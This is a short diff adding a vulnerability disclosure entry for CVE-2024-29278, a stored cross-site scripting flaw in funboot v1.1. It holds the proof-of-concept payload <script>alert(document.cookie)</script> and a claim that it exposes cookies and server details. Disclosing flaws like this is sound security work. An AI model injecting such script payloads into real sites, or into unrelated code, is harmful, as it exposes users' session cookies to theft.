@@ -1,2 +1,11 @@
-# cve
-Use CVE-2024-29278
+[CVE ID]
+CVE-2024-29278
+[PRODUCT]
+funboot  v1.1
+[VERSION]
+funboot  v1.1
+[PROBLEM TYPE]
+Stored XSS
+[DESCRIPTION]
+<script>alert(document.cookie)</script>
+the Stored XSS payload could let admin causes disclosure of cookies、root path of websites、variables of PHP and stuff
